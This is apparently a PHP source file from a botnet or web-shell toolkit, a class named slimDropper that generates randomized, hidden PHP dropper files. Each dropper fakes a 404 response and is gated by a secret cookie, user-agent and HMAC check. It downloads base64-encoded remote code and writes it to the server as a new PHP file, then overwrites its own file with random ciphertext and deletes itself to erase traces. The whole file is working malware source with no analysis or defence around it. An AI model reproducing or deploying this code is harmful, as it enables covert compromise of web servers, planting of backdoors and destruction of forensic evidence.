<?php

namespace new_bots\makeMeSlim;

use Defuse\Crypto\Crypto;
use Defuse\Crypto\Exception\EnvironmentIsBrokenException;
use userAgents\agentsList;

class slimDropper
{
    private ?string $default_template;
    private string $randomized_name;
    protected Crypto $SecureComs;
    private string $initialize_word;
    private string $activator;
    private string $user_agent;
    private string $cookie_name;
    private string $post_variable;
    private $charset;
    private string $random_uuid_var;
    private string $random_var;
    private string $random_var_second;

    /**
     * @throws EnvironmentIsBrokenException
     */
    function __construct(string $agent, string $charset)
    {
        $this->charset = $charset;
        $this->SecureComs = new Crypto();
        $this->randomized_name = bin2hex(openssl_random_pseudo_bytes(25)).".php";
        $this->initialize_word = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 10)));
        $this->user_agent = "{$agent}".bin2hex(openssl_random_pseudo_bytes(10));
        $this->cookie_name = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 10)));
        $this->post_variable = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 10)));
        $this->random_uuid_var = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
        $this->random_var = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));
        $this->random_var_second = substr($this->charset, rand(0, 15), rand(0, 5)) . bin2hex(openssl_random_pseudo_bytes(rand(1, 15)));


    }

    function generateDropper(): array
    {
        $dr = <<<SLIMM
<?php
http_response_code(404);
if (isset(\$_COOKIE['$this->cookie_name']) && \$_SERVER['HTTP_USER_AGENT'] === '$this->user_agent'){
    if (isset(\$_POST['$this->post_variable'])){
        \$$this->random_var_second = explode('.', unserialize(base64_decode(\$_COOKIE['$this->cookie_name']), ['allowed_classes' => false]));
        if ( hash_equals(hash_hmac('sha256', \$_COOKIE['$this->cookie_name'], \${$this->random_var_second}[0]), \${$this->random_var_second}[1]) ){
            if (function_exists("com_create_guid") === true){
                \$$this->random_uuid_var = trim(com_create_guid()).PHP_EOL.PHP_EOL;
            }else{
                \$$this->random_var = openssl_random_pseudo_bytes(16);
                \${$this->random_var}[6] = chr(ord(\${$this->random_var}[6]) & 0x0f | 0x40);
                \${$this->random_var}[8] = chr(ord(\${$this->random_var}[8]) & 0x3f | 0x80);
                \$$this->random_uuid_var = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(\$$this->random_var), 4)).PHP_EOL.PHP_EOL;
            }
            echo \$$this->random_uuid_var . "_$this->randomized_name".PHP_EOL;
            fputs(fopen('./$this->randomized_name', 'a+'), base64_decode(file_get_contents(\$_SERVER['$this->post_variable'][2])));
            foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
                fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
            }
            fclose(\$_SERVER['SCRIPT_FILENAME']);
            unlink(\$_SERVER['SCRIPT_FILENAME']);
        }else{
            die();
        }
        die();
    }
}else{
    die();
}
SLIMM;
        if (!file_exists("lib/new_bots/makeMeSlim/slimmed_droppers/$this->randomized_name")) {
            file_put_contents("lib/new_bots/makeMeSlim/slimmed_droppers/$this->randomized_name", $dr);
            return [
                "dropper" => "lib/new_bots/makeMeSlim/slimmed_droppers/$this->randomized_name",
                "user_agent" => $this->user_agent,
                "cookie_name" => $this->cookie_name,
                "post_variable" => $this->post_variable
            ];
        }
        return [];
    }

}